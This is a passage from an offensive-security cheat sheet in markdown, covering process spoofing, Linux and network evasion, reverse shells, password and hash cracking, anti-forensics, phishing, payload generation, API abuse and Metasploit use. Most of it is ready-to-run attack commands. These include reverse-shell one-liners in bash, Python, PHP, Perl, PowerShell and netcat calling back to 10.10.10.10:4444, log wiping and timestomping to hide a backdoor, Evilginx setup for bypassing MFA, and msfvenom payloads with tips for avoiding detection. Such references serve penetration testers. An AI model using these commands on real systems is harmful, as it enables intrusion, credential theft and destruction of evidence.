InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer_pid);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi);
```

### Linux Evasion

```bash
# LD_PRELOAD rootkit (intercept libc calls)
# Compile shared library that hooks readdir(), open(), etc.
# Add to /etc/ld.so.preload or LD_PRELOAD env

# Process hiding via /proc manipulation
mount -o bind /tmp/empty /proc/<pid>

# Timestomping
touch -r /bin/ls /tmp/backdoor  # Copy timestamps from legitimate file

# Log cleaning
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c && history -w
unset HISTFILE
export HISTSIZE=0
```

### Network Evasion

```bash
# Nmap evasion
nmap -sS -T2 --data-length 50 -D RND:10 --spoof-mac 0 -f <target>

# Domain fronting
curl -H "Host: blocked-domain.com" https://allowed-cdn.com/path

# DNS tunneling
iodine -f dns.attacker.com
dnscat2

# ICMP tunneling
icmpsh (Windows) / icmptunnel (Linux)
```

## Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

# Netcat
nc -e /bin/sh 10.10.10.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# Node.js
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"')

# Upgrade to full TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200
```

## Cryptography Attacks

### Hash Cracking

```bash
# Hashcat modes
hashcat -m 0 hashes.txt rockyou.txt    # MD5
hashcat -m 100 hashes.txt rockyou.txt  # SHA1
hashcat -m 1000 hashes.txt rockyou.txt # NTLM
hashcat -m 1800 hashes.txt rockyou.txt # sha512crypt ($6$)
hashcat -m 3200 hashes.txt rockyou.txt # bcrypt
hashcat -m 13100 hashes.txt rockyou.txt # Kerberoast
hashcat -m 18200 hashes.txt rockyou.txt # AS-REP Roast
hashcat -m 22000 hashes.txt rockyou.txt # WPA-PBKDF2-PMKID+EAPOL

# Rules and masks
hashcat -m 0 -a 0 -r rules/best64.rule hashes.txt rockyou.txt
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d?d?d?s'

# John the Ripper
john --wordlist=rockyou.txt --format=raw-md5 hashes.txt
john --show hashes.txt
```

### TLS/SSL Attacks

```bash
# Enumerate ciphers and vulnerabilities
testssl.sh https://target.com
sslscan target.com:443
nmap --script ssl-enum-ciphers -p 443 target.com

# Certificate pinning bypass (mobile/Frida)
frida -U -f com.app.target -l ssl-bypass.js
```

### Padding Oracle

```bash
# PadBuster (CBC padding oracle attack)
padbuster http://target/page?token=ENCRYPTED_TOKEN ENCRYPTED_TOKEN 16 \
  -encoding 0 -error "Invalid padding"

# Can decrypt ciphertext and forge new encrypted values without the key
```

## Forensics and Anti-Forensics

### Memory Forensics

```bash
# Volatility 3
vol -f memory.dmp windows.info
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.pstree
vol -f memory.dmp windows.cmdline
vol -f memory.dmp windows.netscan
vol -f memory.dmp windows.hashdump
vol -f memory.dmp windows.malfind
vol -f memory.dmp windows.dlllist --pid <pid>

# Linux memory analysis
vol -f memory.lime linux.bash
vol -f memory.lime linux.pslist
vol -f memory.lime linux.check_syscall
```

### Disk Forensics

```bash
# Autopsy / Sleuth Kit
mmls disk.img                           # Partition table
fls -r -o <offset> disk.img            # List files (including deleted)
icat -o <offset> disk.img <inode>      # Extract file by inode
blkcat disk.img <block>                # Extract raw block

# File carving (recover deleted files)
foremost -i disk.img -o output/
scalpel -c scalpel.conf disk.img
photorec disk.img

# Timeline analysis
fls -r -m "/" -o <offset> disk.img > body.txt
mactime -b body.txt -d > timeline.csv
```

### Network Forensics

```bash
# Wireshark/tshark analysis
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -qz conv,tcp
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e data | xxd -r -p

# Extract files from PCAP
foremost -i capture.pcap -o extracted/
tcpflow -r capture.pcap -o flows/
```

### Anti-Forensics

```bash
# Secure file deletion
shred -vfz -n 5 sensitive_file
srm -sz sensitive_file

# Timestamp manipulation
touch -t 202301011200 file                     # Set specific timestamp
touch -r /bin/ls backdoor                      # Clone timestamps

# Log manipulation
utmpdump /var/log/wtmp > /tmp/wtmp.txt        # Edit login records
# Remove entries, then: utmpdump -r < /tmp/wtmp.txt > /var/log/wtmp

# Metadata stripping
exiftool -all= document.pdf
mat2 document.pdf
```

## Password Attacks

### Online Attacks

```bash
# Hydra
hydra -l admin -P rockyou.txt target ssh
hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt target smb

# Medusa
medusa -h target -u admin -P rockyou.txt -M ssh

# CrackMapExec / NetExec
nxc smb target -u users.txt -p passwords.txt --continue-on-success
nxc smb target -u admin -H NTLM_HASH --shares
nxc winrm target -u admin -p password -x "whoami"

# Spray (avoid lockout: 1 password per interval)
sprayhound -U users.txt -p 'Summer2026!' -d domain.local -dc dc.domain.local
```

### Offline Attacks

```bash
# Extract hashes
# Linux: /etc/shadow (unshadow passwd shadow > combined.txt)
# Windows: secretsdump.py domain/admin:pass@dc
# NTDS.dit: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Rule-based attack
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Prince attack (combinatorial)
hashcat -m 1000 -a 0 hashes.txt --prince rockyou.txt

# Mask attack (pattern-based brute force)
hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?d?d?d?s'
# ?u=upper ?l=lower ?d=digit ?s=special

# Combinator attack
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

## Social Engineering

### Phishing

```bash
# GoPhish setup
gophish  # Start GoPhish server on :3333
# Create: sending profile, landing page, email template, user group, campaign

# Evilginx3 (reverse proxy phishing - bypasses MFA)
evilginx3 -p phishlets/
config domain attacker.com
phishlets hostname microsoft365 login.attacker.com
phishlets enable microsoft365
lures create microsoft365

# SET (Social Engineering Toolkit)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
```

### Payload Generation

```bash
# Msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f raw -o shellcode.bin

# HTA payload (delivery via web)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o shell.hta

# Macro payload (Office documents)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba-psh

# Nim/Rust/Go loaders (compile custom, avoid signatures)
# Cross-compile to avoid submitting to VirusTotal from dev machine
```

## API Security Testing

```bash
# Common API vulnerabilities
# BOLA (Broken Object Level Authorization)
# Access other users' objects by changing ID
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/users/OTHER_USER_ID

# BFLA (Broken Function Level Authorization)
# Access admin endpoints with regular user token
curl -X DELETE -H "Authorization: Bearer $USER_TOKEN" https://api.target.com/admin/users/123

# Mass assignment
# Send extra fields the API shouldn't accept
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","role":"admin","isVerified":true}' \
  https://api.target.com/users/me

# Rate limiting bypass
# Rotate headers: X-Forwarded-For, X-Real-IP, X-Originating-IP
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" https://api.target.com/login \
    -d '{"user":"admin","pass":"test'$i'"}'
done

# GraphQL introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'

# GraphQL batch query attack (bypass rate limits)
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"},{"query":"mutation{login(user:\"admin\",pass:\"pass2\")}"}]'
```

## CTF Quick Reference

### Common patterns for Capture The Flag competitions:

```bash
# File analysis
file mystery_file
binwalk mystery_file
strings mystery_file | grep -i flag
xxd mystery_file | head -50
exiftool mystery_file

# Steganography
steghide extract -sf image.jpg
zsteg image.png
stegsolve  # GUI tool for bit plane analysis

# Encoding detection and decoding
echo "base64string" | base64 -d
echo "hex_string" | xxd -r -p
# ROT13: echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Vigenere, Caesar, substitution: use CyberChef

# Crypto challenges
# RSA: factor n -> compute d -> decrypt
# If n is small: factordb.com
# If e is small (e=3): cube root attack
# Common modulus: extended GCD attack
# Wiener's attack: when d is small

# Binary/RE
ltrace ./binary
strace ./binary
gdb ./binary
ghidra  # Decompilation
r2 -A ./binary  # Radare2 analysis

# Web
# Robots.txt, .git exposure, backup files (.bak, .old, ~)
# Cookie manipulation, JWT modification
# Source code review (view-source:, DevTools)
```

```python
# Pwntools CTF template
from pwn import *

context.binary = elf = ELF('./challenge')
context.log_level = 'debug'

# Local
p = process('./challenge')
# Remote
# p = remote('ctf.target.com', 1337)

# GDB attach
# gdb.attach(p, 'b *main+42')

# Interact
p.recvuntil(b'> ')
p.sendline(b'payload')
p.interactive()
```

## Tool Cheatsheets

### Metasploit

```bash
msfconsole
search <keyword>
use <module>
show options
set RHOSTS <target>
set LHOST <attacker>
set PAYLOAD <payload>
exploit

# Post-exploitation (Meterpreter)
sysinfo
getuid
getsystem
hashdump
upload /local/file /remote/path
download /remote/file /local/path
portfwd add -l 8080 -p 80 -r internal_target
run post/multi/recon/local_exploit_suggester
```

### Burp Suite

```
# Key features for testing
# Proxy: intercept and modify requests
# Repeater: send modified requests manually
# Intruder: automated fuzzing (sniper, battering ram, pitchfork, cluster bomb)
# Scanner: automated vulnerability detection
# Decoder: encode/decode (URL, base64, hex, HTML entities)
# Comparer: diff two responses
# Collaborator: OOB interaction detection (DNS, HTTP, SMTP)

# Useful extensions
# AuthMatrix, Autorize (authz testing)
# Active Scan++ (enhanced scanner)
# JWT Editor (JWT manipulation)
# Param Miner (hidden parameter discovery)
# Turbo Intruder (high-speed fuzzing)
```

### Nmap Script Categories

```bash
# Vulnerability detection
nmap --script vuln <target>

# Specific scripts
nmap --script smb-vuln-ms17-010 <target>     # EternalBlue
nmap --script http-shellshock <target>         # Shellshock
nmap --script ssl-heartbleed <target>          # Heartbleed
nmap --script smb-enum-shares <target>         # SMB shares
nmap --script dns-zone-transfer <target>       # DNS AXFR
nmap --script http-enum <target>               # Web directories

# Brute force
nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt <target>
nmap --script http-brute --script-args http-brute.path=/admin <target>
```
